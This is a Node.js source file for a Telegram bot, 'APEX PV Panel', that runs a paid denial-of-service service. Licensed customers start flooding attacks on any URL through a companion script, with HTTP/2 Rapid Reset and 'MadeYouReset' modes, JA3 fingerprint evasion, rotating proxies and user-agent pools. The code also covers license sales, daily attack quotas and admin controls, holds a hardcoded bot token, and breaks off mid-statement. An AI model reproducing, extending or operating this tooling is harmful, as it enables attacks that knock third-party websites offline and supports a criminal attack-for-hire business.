'use strict';

const fs   = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const TelegramBot = require('node-telegram-bot-api');

// defensive import — handles broken installs that return { default: ... }
const Bot = typeof TelegramBot === 'function'
    ? TelegramBot
    : (TelegramBot && (TelegramBot.default || TelegramBot.TelegramBot)) || null;
if (typeof Bot !== 'function') {
    throw new Error('node-telegram-bot-api did not export a constructor. Run: npm i node-telegram-bot-api@0.66.0');
}

// =============================================================
//  CONFIG
// =============================================================
const CONFIG = {
    OWNER_ID:   8872751291,
    BOT_TOKEN:  '9165297622:AAGGzWZhdv6R1Z9K6f5685LrahBj2sTN2TM',

    SCRIPT_PATH: 'pv_http.js',           // pv_http.js lives next to bot.js
    BANNER_FILE: 'banner.txt',

    MAX_ATTACK_DURATION:     30,          // minutes (pv_http -t)
    MAX_CONCURRENT_GLOBAL:   8,
    HARD_MAX_CONC:           500,         // pv_http --conc
    HARD_MAX_RATE:           500,         // reserved (pv_http has no --rate)

    DATA_DIR: path.join(__dirname, 'data'),
};

// =============================================================
//  STORAGE
// =============================================================
if (!fs.existsSync(CONFIG.DATA_DIR)) fs.mkdirSync(CONFIG.DATA_DIR, { recursive: true });

const FILES = {
    users:    path.join(CONFIG.DATA_DIR, 'users.json'),
    licenses: path.join(CONFIG.DATA_DIR, 'licenses.json'),
    admins:   path.join(CONFIG.DATA_DIR, 'admins.json'),
    stats:    path.join(CONFIG.DATA_DIR, 'stats.json'),
    proxies:  path.join(CONFIG.DATA_DIR, 'proxy.txt'),   // <- matches pv_http default naming
    uas:      path.join(CONFIG.DATA_DIR, 'ua.txt'),      // <- matches pv_http default naming
};

const loadJSON = (f, d) => { try { return JSON.parse(fs.readFileSync(f, 'utf8')); } catch { return d; } };
const saveJSON = (f, d) => { try { fs.writeFileSync(f, JSON.stringify(d, null, 2)); } catch (e) { console.error(e); } };

let users    = loadJSON(FILES.users, {});
let licenses = loadJSON(FILES.licenses, {});
let admins   = loadJSON(FILES.admins, []);
let stats    = loadJSON(FILES.stats, { totalAttacks: 0, totalUsers: 0, totalLicenses: 0 });

// seed empty pool files if missing
if (!fs.existsSync(FILES.proxies)) fs.writeFileSync(FILES.proxies, '');
if (!fs.existsSync(FILES.uas))     fs.writeFileSync(FILES.uas, '');

// legacy migration (./proxies.txt or ./data/proxies.txt → ./data/proxy.txt)
(function migrate() {
    const legacyPluralRoot = path.join(__dirname, 'proxies.txt');
    const legacyPluralData = path.join(CONFIG.DATA_DIR, 'proxies.txt');
    if (fs.existsSync(FILES.proxies) && fs.statSync(FILES.proxies).size > 0) return;
    if (fs.existsSync(legacyPluralRoot)) { try { fs.copyFileSync(legacyPluralRoot, FILES.proxies); } catch {} return; }
    if (fs.existsSync(legacyPluralData)) { try { fs.copyFileSync(legacyPluralData, FILES.proxies); } catch {} }
})();

// =============================================================
//  RUNTIME STATE
// =============================================================
const userState     = new Map();
const activeAttacks = new Map();
let   attackCounter = 0;

// =============================================================
//  HELPERS
// =============================================================
const now     = () => Date.now();
const DAY     = 86400000;
const isOwner = id => Number(id) === CONFIG.OWNER_ID;
const isAdmin = id => isOwner(id) || admins.includes(Number(id));
const esc     = s => String(s).replace(/[_*`\[\]()~>#+\-=|{}.!]/g, m => '\\' + m);

function getUser(id) {
    const k = String(id);
    if (!users[k]) {
        users[k] = {
            id: Number(id), username: '', firstName: '',
            joinedAt: now(), licenseKey: null, activatedAt: null, expiresAt: null,
            banned: false, totalAttacks: 0,
            daily: { date: '', count: 0 },
            lastAttackAt: 0,
        };
    }
    const u = users[k];
    if (!u.daily) u.daily = { date: '', count: 0 };
    if (typeof u.lastAttackAt !== 'number') u.lastAttackAt = 0;
    return u;
}

function todayStr() {
    const d = new Date();
    return `${d.getUTCFullYear()}-${String(d.getUTCMonth()+1).padStart(2,'0')}-${String(d.getUTCDate()).padStart(2,'0')}`;
}

function resetDailyIfNeeded(u) {
    const t = todayStr();
    if (u.daily.date !== t) { u.daily.date = t; u.daily.count = 0; }
}

function getLicenseForUser(userId) {
    const u = users[String(userId)];
    if (!u || !u.licenseKey) return null;
    return licenses[u.licenseKey] || null;
}

function isLicensed(id) {
    const u = users[String(id)];
    if (!u || u.banned) return false;
    return u.expiresAt && u.expiresAt > now();
}

function fmtDate(ts) {
    if (!ts) return '—';
    return new Date(ts).toISOString().replace('T', ' ').slice(0, 16) + ' UTC';
}

function genLicenseKey() {
    const seg = () => Math.random().toString(36).substring(2, 6).toUpperCase().padEnd(4, 'X');
    return `APEX-${seg()}-${seg()}-${seg()}-${seg()}`;
}

function countLines(f) {
    try {
        const raw = fs.readFileSync(f, 'utf8');
        return raw.split('\n').map(l => l.trim()).filter(Boolean).length;
    } catch { return 0; }
}

// =============================================================
//  QUOTA / COOLDOWN
// =============================================================
function checkAttackPermission(userId) {
    const u = getUser(userId);
    const lic = getLicenseForUser(userId);

    if (!u.expiresAt || u.expiresAt <= now())
        return { ok: false, reason: 'Your license has expired. Contact admin.' };

    resetDailyIfNeeded(u);
    const dailyLimit = lic?.dailyLimit ?? 5;
    if (u.daily.count >= dailyLimit)
        return { ok: false, reason: `Daily attack limit reached (${u.daily.count}/${dailyLimit}). Resets at 00:00 UTC.` };

    const cooldownMs = (lic?.cooldownSeconds ?? 60) * 1000;
    const remain = u.lastAttackAt + cooldownMs - now();
    if (remain > 0)
        return { ok: false, reason: `Cooldown active: wait ${Math.ceil(remain/1000)}s before next attack.` };

    const concurrent = [...activeAttacks.values()].filter(a => a.userId === userId).length;
    const maxConc = lic?.maxConcurrent ?? 1;
    if (concurrent >= maxConc)
        return { ok: false, reason: `Concurrent attack limit reached (${concurrent}/${maxConc}).` };

    if (activeAttacks.size >= CONFIG.MAX_CONCURRENT_GLOBAL)
        return { ok: false, reason: 'Server is busy. Try again in a moment.' };

    return { ok: true, license: lic };
}

// =============================================================
//  KEYBOARDS
// =============================================================
function mainMenuKeyboard(userId) {
    const rows = [
        [{ text: '🚀 New Attack',        callback_data: 'menu_attack' }],
        [{ text: '📊 My Active Attacks', callback_data: 'menu_active' }],
        [{ text: '🔑 License Info',      callback_data: 'menu_license' }],
    ];
    if (isAdmin(userId)) rows.push([{ text: '🛡 Admin Panel', callback_data: 'menu_admin' }]);
    return { inline_keyboard: rows };
}

function adminMenuKeyboard() {
    return {
        inline_keyboard: [
            [{ text: '📊 Stats',            callback_data: 'adm_stats' },
             { text: '👥 Users',            callback_data: 'adm_users' }],
            [{ text: '🔑 Create License',   callback_data: 'adm_gen_license' },
             { text: '📋 Licenses',         callback_data: 'adm_licenses' }],
            [{ text: '🚫 Ban User',         callback_data: 'adm_ban' },
             { text: '✅ Unban User',       callback_data: 'adm_unban' }],
            [{ text: '♻️ Reset Cooldown',   callback_data: 'adm_reset_cd' }],
            [{ text: '👤 Add Admin',        callback_data: 'adm_add_admin' },
             { text: '🗑 Remove Admin',     callback_data: 'adm_rm_admin' }],
            [{ text: '➕ Add Proxies',      callback_data: 'adm_proxies_add' },
             { text: '♻️ Replace Proxies',  callback_data: 'adm_proxies_replace' }],
            [{ text: '📈 Proxy Count',      callback_data: 'adm_proxies_count' }],
            [{ text: '🌐 Add UAs',          callback_data: 'adm_ua_add' },
             { text: '♻️ Replace UAs',      callback_data: 'adm_ua_replace' }],
            [{ text: '📈 UA Count',         callback_data: 'adm_ua_count' }],
            [{ text: '🛑 Stop All Attacks', callback_data: 'adm_stop_all' }],
            [{ text: '📢 Broadcast',        callback_data: 'adm_broadcast' }],
        ]
    };
}

function attackModeKeyboard(current) {
    const m = v => (current === v ? '✅ ' : '');
    return {
        inline_keyboard: [
            [{ text: m('none')          + 'None (load test)', callback_data: 'amd_none' }],
            [{ text: m('rapid-reset')   + 'Rapid Reset',      callback_data: 'amd_rapid-reset' }],
            [{ text: m('madeyoureset')  + 'MadeYouReset',     callback_data: 'amd_madeyoureset' }],
        ]
    };
}

function attackProtocolKeyboard(current) {
    const m = v => (current === v ? '✅ ' : '');
    return {
        inline_keyboard: [
            [{ text: m('h2')       + 'H2 (default)', callback_data: 'apr_h2' },
             { text: m('h1')       + 'H1',           callback_data: 'apr_h1' }],
            [{ text: m('h1,h2')    + 'H1 + H2',      callback_data: 'apr_h1,h2' },
             { text: m('h3')       + 'H3 (impers)',  callback_data: 'apr_h3' }],
        ]
    };
}

function attackOptionsKeyboard(data) {
    const o = data.options || {};
    const m = v => (v ? '✅ ' : '❌ ');
    return {
        inline_keyboard: [
            [{ text: m(o.ja3)          + 'JA3 Evasion', callback_data: 'opt_ja3' },
             { text: m(o.adaptiveDelay) + 'Adaptive',   callback_data: 'opt_adaptive' }],
            [{ text: m(o.advBurst)      + 'Adv Burst',  callback_data: 'opt_advburst' },
             { text: m(o.forceHttp3)    + 'Force H3',   callback_data: 'opt_forceh3' }],
            [{ text: m(o.proxyRandom)   + 'Proxy Random', callback_data: 'opt_proxyrandom' },
             { text: m(!o.noProxy)      + 'Use Proxy',    callback_data: 'opt_usproxy' }],
            [{ text: '✅ Confirm & Start', callback_data: 'opt_confirm' },
             { text: '❌ Cancel',          callback_data: 'opt_cancel' }],
        ]
    };
}

// =============================================================
//  ATTACK LAUNCHER
// =============================================================
function startAttack(chatId, userId, cfg, reply) {
    const perm = checkAttackPermission(userId);
    if (!perm.ok) return reply(`❌ ${perm.reason}`);

    const scriptPath = path.join(__dirname, CONFIG.SCRIPT_PATH);
    if (!fs.existsSync(scriptPath)) return reply('❌ pv_http.js not found next to bot.js.');

    // require proxies when proxy mode is enabled
    if (!cfg.options.noProxy) {
        if (!fs.existsSync(FILES.proxies) || fs.statSync(FILES.proxies).size < 5)
            return reply('❌ Proxy pool is empty (data/proxy.txt). Contact admin or disable proxy.');
    }

    // args: node pv_http.js -u <url> -t <min> -c <conc> [-a <mode>] [-p <protocols>] --proxy-file ... --ua-file ... [flags]
    const args = [CONFIG.SCRIPT_PATH];
    args.push('-u', cfg.target);
    args.push('-t', String(cfg.duration));
    args.push('-c', String(cfg.conc));

    if (cfg.mode && cfg.mode !== 'none') args.push('-a', cfg.mode);
    if (cfg.protocol) args.push('-p', cfg.protocol);

    args.push('--proxy-file', FILES.proxies);
    args.push('--ua-file', FILES.uas);

    if (cfg.options.ja3)          args.push('--ja3-evasion');
    else                          args.push('--no-ja3-evasion').length = 0; // no-op guard (no such flag)
    if (cfg.options.adaptiveDelay) args.push('--adaptive-delay');
    if (cfg.options.advBurst)      args.push('--adv-burst');
    if (cfg.options.forceHttp3)    args.push('--force-http3');
    if (cfg.options.proxyRandom)   args.push('--proxy-random');
    if (cfg.options.noProxy)       args.push('--no-proxy');

    // NOTE: pv_http -t is MINUTES, not seconds
    const proc = spawn('node', args, {
        cwd: __dirname,
        stdio: ['ignore', 'pipe', 'pipe'],
        env: { ...process.env, FORCE_COLOR: '0' },
    });

    const attackId = ++attackCounter;
    const endTime  = now() + cfg.duration * 60 * 1000;

    let stderrBuf = '';
    let stdoutBuf = '';
    proc.stderr.on('data', d => {
        stderrBuf += d.toString();
        if (stderrBuf.length > 16000) stderrBuf = stderrBuf.slice(-16000);
    });
    proc.stdout.on('data', d => {
        stdoutBuf += d.toString();
        if (stdoutBuf.length > 16000) stdoutBuf = stdoutBuf.slice(-16000);
    });

    const killTimer = setTimeout(() => {
        if (activeAttacks.has(attackId)) { try { proc.kill('SIGKILL'); } catch {} }
    }, (cfg.duration * 60 + 20) * 1000);

    activeAttacks.set(attackId, {
        id: attackId, chatId, userId,
        target: cfg.target, duration: cfg.duration, conc: cfg.conc, mode: cfg.mode, protocol: cfg.protocol,
        options: cfg.options,
        proc, endTime, startedAt: now(), killTimer,
    });

    const u = getUser(userId);
    resetDailyIfNeeded(u);
    u.daily.count += 1;
    u.lastAttackAt = now();
    u.totalAttacks = (u.totalAttacks || 0) + 1;
    saveJSON(FILES.users, users);

    stats.totalAttacks = (stats.totalAttacks || 0) + 1;
    saveJSON(FILES.stats, stats);

    proc.on('exit', code => {
        clearTimeout(killTimer);
        activeAttacks.delete(attackId);

        let errorTail = '';
        if (code !== 0) {
            const src = (stderrBuf.trim() || stdoutBuf.trim());
            if (src) {
                const lines = src.split('\n').slice(-12).join('\n');
                errorTail = `\n\n📋 Last error:\n\`\`\`\n${lines}\n\`\`\``;
            }
        }

        const msg =
            `✅ *Attack #${attackId} finished*\n` +
            `🎯 \`${cfg.target}\`\n` +
            `⏱ ${cfg.duration}min · conc ${cfg.conc} · ${cfg.mode} · ${cfg.protocol}\n` +
            `exit ${code}${errorTail}`;

        bot.sendMessage(chatId, msg.length > 4000 ? msg.slice(0, 3990) + '\n...' : msg,
            { parse_mode: 'Markdown' }
        ).catch(() => {
            const plain =
                `Attack #${attackId} finished (exit ${code})\n` +
                `Target: ${cfg.target}\n\n` +
                ((stderrBuf.trim() || stdoutBuf.trim()).split('\n').slice(-12).join('\n') || '');
            bot.sendMessage(chatId, plain.slice(0, 4000)).catch(() => {});
        });
    });

    proc.on('error', err => {
        bot.sendMessage(chatId, `❌ Launch error: ${esc(err.message)}`).catch(() => {});
    });

    const flagList = [];
    if (cfg.options.ja3)          flagList.push('ja3');
    if (cfg.options.adaptiveDelay) flagList.push('adaptive-delay');
    if (cfg.options.advBurst)     flagList.push('adv-burst');
    if (cfg.options.forceHttp3)   flagList.push('force-http3');
    if (cfg.options.proxyRandom)  flagList.push('proxy-random');
    if (cfg.options.noProxy)      flagList.push('no-proxy');

    const lic = getLicenseForUser(userId);
    const dailyLeft = (lic?.dailyLimit ?? 5) - u.daily.count;
    const cd = lic?.cooldownSeconds ?? 60;

    reply(
        `🚀 *Attack #${attackId} started*\n\n` +
        `🎯 Target: \`${cfg.target}\`\n` +
        `⏱ Duration: ${cfg.duration} min\n` +
        `🧵 Concurrency: ${cfg.conc}\n` +
        `⚔️ Attack: ${cfg.mode}\n` +
        `🧩 Protocol: ${cfg.protocol}\n` +
        `🔧 Flags: ${flagList.join(', ') || '—'}\n\n` +
        `📊 *Quota*\n` +
        `• Daily used: ${u.daily.count}/${lic?.dailyLimit ?? 5} (${dailyLeft} left)\n` +
        `• Cooldown: ${cd}s`
    );
    return attackId;
}

// =============================================================
//  BOT INIT
// =============================================================
const bot = new Bot(CONFIG.BOT_TOKEN, { polling: true });

bot.setMyCommands([
    { command: 'start',  description: 'Start / Main menu' },
    { command: 'attack', description: 'Quick attack: /attack <url> [min] [conc] [flags]' },
    { command: 'active', description: 'My active attacks' },
    { command: 'quota',  description: 'Check cooldown + daily quota' },
    { command: 'cancel', description: 'Cancel current operation' },
    { command: 'admin',  description: 'Admin panel (admin only)' },
]).catch(() => {});

// =============================================================
//  /start
// =============================================================
bot.onText(/^\/start(?:@\w+)?(?:\s|$)/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const u = getUser(userId);
    u.username  = msg.from.username || u.username;
    u.firstName = msg.from.first_name || u.firstName;
    saveJSON(FILES.users, users);

    if (u.banned) return bot.sendMessage(chatId, '⛔️ You are banned from this bot.');

    if (!isLicensed(userId)) {
        userState.set(chatId, { step: 'await_license', data: {} });
        return bot.sendMessage(chatId,
            `🎯 *APEX PV Panel*\n\n` +
            `Welcome ${esc(msg.from.first_name || 'friend')} 👋\n\n` +
            `🔑 Send your license key to activate.\n\n` +
            `📝 Format: \`APEX-XXXX-XXXX-XXXX-XXXX\``,
            { parse_mode: 'Markdown' }
        );
    }

    const lic = getLicenseForUser(userId);
    resetDailyIfNeeded(u);
    saveJSON(FILES.users, users);

    const daysLeft = Math.max(0, Math.ceil((u.expiresAt - now()) / DAY));
    const cdRemain = Math.max(0, Math.ceil((u.lastAttackAt + (lic?.cooldownSeconds ?? 60)*1000 - now()) / 1000));

    bot.sendMessage(chatId,
        `🎯 *APEX PV Panel*\n\n` +
        `👤 User ID: \`${userId}\`\n` +
        `📅 License valid: ${daysLeft} day(s)\n` +
        `📊 Daily quota: ${u.daily.count}/${lic?.dailyLimit ?? 5}\n` +
        `⏳ Cooldown: ${cdRemain > 0 ? cdRemain + 's remaining' : 'ready'}\n\n` +
        `Choose from the menu:`,
        { parse_mode: 'Markdown', reply_markup: mainMenuKeyboard(userId) }
    );
});

// =============================================================
//  /quota
// =============================================================
bot.onText(/^\/quota/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isLicensed(userId)) return bot.sendMessage(chatId, '❌ No active license.');
    const u = getUser(userId);
    const lic = getLicenseForUser(userId);
    resetDailyIfNeeded(u);
    saveJSON(FILES.users, users);

    const cdRemain = Math.max(0, Math.ceil((u.lastAttackAt + (lic?.cooldownSeconds ?? 60)*1000 - now()) / 1000));
    const dailyLeft = (lic?.dailyLimit ?? 5) - u.daily.count;

    bot.sendMessage(chatId,
        `📊 *Your Quota*\n\n` +
        `• Daily: ${u.daily.count}/${lic?.dailyLimit ?? 5} used — ${dailyLeft} left\n` +
        `• Cooldown: ${cdRemain > 0 ? cdRemain + 's remaining' : '✅ ready'}\n` +
        `• Concurrent limit: ${lic?.maxConcurrent ?? 1}\n` +
        `• Resets daily at 00:00 UTC`,
        { parse_mode: 'Markdown' }
    );
});

// =============================================================
//  /admin
// =============================================================
bot.onText(/^\/admin/, (msg) => {
    if (!isAdmin(msg.from.id)) return;
    bot.sendMessage(msg.chat.id, '🛡 *Admin Panel*', {
        parse_mode: 'Markdown', reply_markup: adminMenuKeyboard()
    });
});

// =============================================================
//  /active
// =============================================================
bot.onText(/^\/active/, (msg) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const list = [...activeAttacks.values()].filter(a => a.userId === userId);
    if (!list.length) return bot.sendMessage(chatId, '📭 No active attacks.');
    const kb = { inline_keyboard: [] };
    let txt = '📊 *Your Active Attacks*\n\n';
    for (const a of list) {
        const rem = Math.max(0, Math.floor((a.endTime - now()) / 1000));
        txt += `#${a.id} → \`${a.target}\` — ${Math.ceil(rem/60)}m · ${a.mode}\n`;
        kb.inline_keyboard.push([{ text: `🛑 Stop #${a.id}`, callback_data: `stop_${a.id}` }]);
    }
    bot.sendMessage(chatId, txt, { parse_mode: 'Markdown', reply_markup: kb });
});

// =============================================================
//  /cancel
// =============================================================
bot.onText(/^\/cancel/, (msg) => {
    userState.delete(msg.chat.id);
    bot.sendMessage(msg.chat.id, '❌ Operation cancelled.');
});

// =============================================================
//  /attack (one-liner)
// /attack <url> [minutes] [conc] [mode] [protocol] [flags...]
//   flags: -proxy-random  -noproxy  -adaptive  -advburst  -h3  -noja3
// =============================================================
bot.onText(/^\/attack(?:\s+(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    if (!isLicensed(userId)) return bot.sendMessage(chatId, '❌ No active license.');
    const raw = (match[1] || '').trim();
    if (!raw) {
        userState.set(chatId, { step: 'attack_target', data: {} });
        return bot.sendMessage(chatId, '🎯 Send target URL:');
    }
    const parts = raw.split(/\s+/);
    let target = parts[0];
    if (!/^https?:\/\//i.test(target)) target = 'https://' + target;

    const duration = Math.min(parseInt(parts[1]) || 1, CONFIG.MAX_ATTACK_DURATION);
    const conc     = Math.min(parseInt(parts[2]) || 50, CONFIG.HARD_MAX_CONC);
    const mode     = ['none','rapid-reset','madeyoureset'].includes(parts[3]) ? parts[3] : 'none';
    const protocol = ['h1','h2','h3','h1,h2'].includes(parts[4]) ? parts[4] : 'h2';
    const flags    = parts.slice(5);

    const options = {
        ja3:           !flags.includes('-noja3'),
        adaptiveDelay: flags.includes('-adaptive'),
        advBurst:      flags.includes('-advburst'),
        forceHttp3:    flags.includes('-h3'),
        proxyRandom:   flags.includes('-proxy-random'),
        noProxy:       flags.includes('-noproxy'),
    };

    startAttack(chatId, userId, { target, duration, conc, mode, protocol, options },
        t => bot.sendMessage(chatId, t, { parse_mode: 'Markdown' }));
});

// =============================================================
//  MESSAGE HANDLER
// =============================================================
bot.on('message', async (msg) => {
    if (!msg.text || msg.text.startsWith('/')) return;
    const chatId = msg.chat.id;
    const userId = msg.from.id;
    const st = userState.get(chatId);
    if (!st) return;

    // ---- license activation ----
    if (st.step === 'await_license') {
        const code = msg.text.trim().toUpperCase();
        const lic = licenses[code];
        if (!lic) return bot.sendMessage(chatId, '❌ Invalid license key.');
        if (lic.expiresAt && lic.expiresAt < now()) return bot.sendMessage(chatId, '❌ This license has expired.');
        if ((lic.usedCount || 0) >= lic.maxUses) return bot.sendMessage(chatId, '❌ This license is fully used.');

        lic.usedCount = (lic.usedCount || 0) + 1;
        lic.usedBy = lic.usedBy || [];
        lic.usedBy.push({ userId, at: now() });
        saveJSON(FILES.licenses, licenses);

        const u = getUser(userId);
        const startFrom = Math.max(now(), u.expiresAt || 0);
        u.licenseKey  = code;
        u.activatedAt = now();
        u.expiresAt   = startFrom + lic.durationDays * DAY;
        u.daily = { date: todayStr(), count: 0 };
        u.lastAttackAt = 0;
        saveJSON(FILES.users, users);

        userState.delete(chatId);
        await bot.sendMessage(chatId,
            `✅ *License activated!*\n\n` +
            `📅 Duration: ${lic.durationDays} day(s)\n` +
            `📊 Daily limit: ${lic.dailyLimit ?? 5} attacks\n` +
            `⏳ Cooldown: ${lic.cooldownSeconds ?? 60}s\n` +
            `🧵 Concurrent: ${lic.maxConcurrent ?? 1}`,
            { parse_mode: 'Markdown' });
        return bot.sendMessage(chatId, 'Choose from the menu:',
            { reply_markup: mainMenuKeyboard(userId) });
    }

    // ---- attack wizard ----
    if (st.step === 'attack_target') {
        let t = msg.text.trim();
        if (!/^https?:\/\//i.test(t)) t = 'https://' + t;
        try {
            const u = new URL(t);
            if (!u.hostname) throw new Error();
            st.data.target = t;
            st.step = 'attack_duration';
            return bot.sendMessage(chatId, `⏱ Duration in MINUTES (1 - ${CONFIG.MAX_ATTACK_DURATION}):`);
        } catch {
            return bot.sendMessage(chatId, '❌ Invalid URL. Try again:');
        }
    }

    if (st.step === 'attack_duration') {
        const d = parseInt(msg.text.trim());
        if (!d || d < 1 || d > CONFIG.MAX_ATTACK_DURATION)
            return bot.sendMessage(chatId, `❌ Must be 1 - ${CONFIG.MAX_ATTACK_DURATION} minutes.`);
        st.data.duration = d;
        st.step = 'attack_conc';
        return bot.sendMessage(chatId,
            `🧵 Concurrency (1 - ${CONFIG.HARD_MAX_CONC}):`,
            { reply_markup: { inline_keyboard: [[{ text: 'Use default (50)', callback_data: 'def_conc' }]] } });
    }

    if (st.step === 'attack_conc') {
        const c = parseInt(msg.text.trim());
        if (!c || c < 1 || c > CONFIG.HARD_MAX_CONC)
            return bot.sendMessage(chatId, `❌ Must be 1 - ${CONFIG.HARD_MAX_CONC}.`);
        st.data.conc = c;
        st.data.mode = 'none';
        st.step = 'attack_mode';
        return bot.sendMessage(chatId, '⚔️ Choose attack mode:',
            { reply_markup: attackModeKeyboard(st.data.mode) });
    }

    // ---- license creation ----
    if (st.step === 'adm_lic_days') {
        if (!isAdmin(userId)) return;
        const d = parseInt(msg.text.trim());
        if (!d || d < 1 || d > 3650) return bot.sendMessage(chatId, '❌ 1 - 3650 days.');
        st.data.days = d;
        st.step = 'adm_lic_uses';
        return bot.sendMessage(chatId, '👥 Max activations:',
            { reply_markup: { inline_keyboard: [
                [{ text: '1 (single)', callback_data: 'lic_uses_1' }, { text: '5', callback_data: 'lic_uses_5' }],
                [{ text: '10', callback_data: 'lic_uses_10' }, { text: '∞', callback_data: 'lic_uses_inf' }],
            ] } });
    }

    if (st.step === 'adm_lic_daily') {
        if (!isAdmin(userId)) return;
        const d = parseInt(msg.text.trim());
        if (!d || d < 1 || d > 1000) return bot.sendMessage(chatId, '❌ 1 - 1000 attacks/day.');
        st.data.dailyLimit = d;
        st.step = 'adm_lic_cooldown';
        return bot.sendMessage(chatId, '⏳ Cooldown between attacks (seconds, 0 - 86400):');
    }

    if (st.step === 'adm_lic_cooldown') {
        if (!isAdmin(userId)) return;
        const s = parseInt(msg.text.trim());
        if (isNaN(s) || s < 0 || s > 86400) return bot.sendMessage(chatId, '❌ 0 - 86400 seconds.');
        st.data.cooldownSeconds = s;
        st.step = 'adm_lic_concurrent';
        return bot.sendMessage(chatId, '🧵 Max concurrent attacks per user (1 - 10):');
    }

    if (st.step === 'adm_lic_concurrent') {
        if (!isAdmin(userId)) return;
        const c = parseInt(msg.text.trim());
        if (!c || c < 1 || c > 10) return bot.sendMessage(chatId, '❌ 1 - 10.');
        st.data.maxConcurrent = c;

        const key = genLicenseKey();
        licenses[key] = {
            key,
            durationDays:    st.data.days,
            maxUses:         st.data.uses,
            dailyLimit:      st.data.dailyLimit,
            cooldownSeconds: st.data.cooldownSeconds,
            maxConcurrent:   st.data.maxConcurrent,
            usedCount: 0,
            usedBy: [],
            createdAt: now(),
            expiresAt: now() + 365 * DAY,
            createdBy: userId,
        };
        saveJSON(FILES.licenses, licenses);
        stats.totalLicenses = (stats.totalLicenses || 0) + 1;
        saveJSON(FILES.stats, stats);
        userState.delete(chatId);

        return bot.sendMessage(chatId,
            `✅ *License created*\n\n` +
            `🔑 \`${key}\`\n\n` +
            `📅 Access: ${st.data.days} day(s)\n` +
            `👥 Activations: ${st.data.uses === 9999 ? '∞' : st.data.uses}\n` +
            `📊 Daily limit: ${st.data.dailyLimit} attack(s)\n` +
            `⏳ Cooldown: ${st.data.cooldownSeconds}s\n` +
            `🧵 Concurrent: ${st.data.maxConcurrent}\n\n` +
            `Send this key to your customer.`,
            { parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() }
        );
    }

    // ---- broadcast ----
    if (st.step === 'adm_broadcast') {
        if (!isAdmin(userId)) return;
        const text = msg.text;
        let ok = 0, fail = 0;
        for (const id of Object.keys(users)) {
            try { await bot.sendMessage(id, `📢 *Admin broadcast*\n\n${text}`, { parse_mode: 'Markdown' }); ok++; }
            catch { fail++; }
        }
        userState.delete(chatId);
        return bot.sendMessage(chatId, `📢 Sent.\n✅ ${ok} | ❌ ${fail}`);
    }

    // ---- proxies add/replace ----
    if (st.step === 'adm_proxies') {
        if (!isAdmin(userId)) return;

        const newLines = msg.text
            .split('\n')
            .map(l => l.trim())
            .filter(l => l && !l.startsWith('#'))
            .filter(l => {
                // accept host:port, http(s)://..., user:pass@host:port
                return /^https?:\/\//i.test(l)
                    || /^[^:\s]+:\d+$/.test(l)
                    || /^[^:\s]+:\d+:[^:\s]+:[^:\s]+$/.test(l)
                    || /^[^:\s]+:[^:\s]+@[^:\s]+:\d+$/.test(l);
            });

        if (!newLines.length)
            return bot.sendMessage(chatId, '❌ No valid lines detected.\nAccepted formats: `host:port`, `http://host:port`, `http://user:pass@host:port`, `host:port:user:pass`', { parse_mode: 'Markdown' });

        let existing = [];
        try {
            existing = fs.readFileSync(FILES.proxies, 'utf8')
                .split('\n').map(l => l.trim()).filter(Boolean);
        } catch {}

        const mode = st.data.mode || 'add';
        let finalList = mode === 'replace'
            ? [...new Set(newLines)]
            : [...new Set([...existing, ...newLines])];

        fs.writeFileSync(FILES.proxies, finalList.join('\n'));
        userState.delete(chatId);

        return bot.sendMessage(chatId,
            `✅ *Proxies updated*\n\n` +
            `📥 Submitted: ${newLines.length}\n` +
            `♻️ Mode: ${mode === 'replace' ? 'REPLACED' : 'MERGED'}\n` +
            `📊 Total in pool: *${finalList.length}*\n` +
            `📁 File: \`data/proxy.txt\``,
            { parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() }
        );
    }

    // ---- UAs add/replace ----
    if (st.step === 'adm_ua') {
        if (!isAdmin(userId)) return;

        const newLines = msg.text
            .split('\n')
            .map(l => l.trim())
            .filter(l => l && !l.startsWith('#') && l.length > 20);

        if (!newLines.length)
            return bot.sendMessage(chatId, '❌ No valid UA lines (each line must be a full user-agent string).');

        let existing = [];
        try {
            existing = fs.readFileSync(FILES.uas, 'utf8')
                .split('\n').map(l => l.trim()).filter(Boolean);
        } catch {}

        const mode = st.data.mode || 'add';
        const finalList = mode === 'replace'
            ? [...new Set(newLines)]
            : [...new Set([...existing, ...newLines])];

        fs.writeFileSync(FILES.uas, finalList.join('\n'));
        userState.delete(chatId);

        return bot.sendMessage(chatId,
            `✅ *UAs updated*\n\n` +
            `📥 Submitted: ${newLines.length}\n` +
            `♻️ Mode: ${mode === 'replace' ? 'REPLACED' : 'MERGED'}\n` +
            `📊 Total in pool: *${finalList.length}*\n` +
            `📁 File: \`data/ua.txt\``,
            { parse_mode: 'Markdown', reply_markup: adminMenuKeyboard() }
        );
    }

    // ---- ban / unban ----
    if (st.step === 'adm_ban' || st.step === 'adm_unban') {
        if (!isAdmin(userId)) return;
        const tgt = parseInt(msg.text.trim());
        if (!users[tgt]) return bot.sendMessage(chatId, '❌ User not found.');
        users[tgt].banned = st.step === 'adm_ban';
        saveJSON(FILES.users, users);
        userState.delete(chatId);
        return bot.sendMessage(chatId,
            `✅ User \`${tgt}\` ${st.step === 'adm_ban' ? 'banned' : 'unbanned'}.`,
            { parse_mode: 'Markdown' });
    }

    // ---- reset cooldown ----
    if (st.step === 'adm_reset_cd') {
        if (!isAdmin(userId)) return;
        const tgt = parseInt(msg.text.trim());
        if (!users[tgt]) return bot.sendMessage(chatId, '❌ User not found.');
        users[tgt].lastAttackAt = 0;
        users[tgt].daily = { date: todayStr(), count: 0 };
        saveJSON(FILES.users, users);
        userState.delete(chatId);
        return bot.sendMessage(chatId,
            `♻️ Cooldown + daily counter reset for \`${tgt}\`.`,
            { parse_mode: 'Markdown' });
    }

    // ---- add / remove admin ----
    if (st.step === 'adm_add_admin' || st.step === 'adm_rm_admin') {
        if (!isOwner(userId)) return bot.sendMessage(chatId, '❌ Owner only.');
        const tgt = parseInt(msg.text.trim());
        if (!tgt) return;
        if (st.step === 'adm_add_admin') {
            if (!admins.includes(tgt)) admins.push(tgt);
        } else {
            admins = admins.filter(a => a !== tgt);
        }
        saveJSON(FILES.admins, admins);
        userState.delete(chatId);
        return bot.sendMessage(chatId,
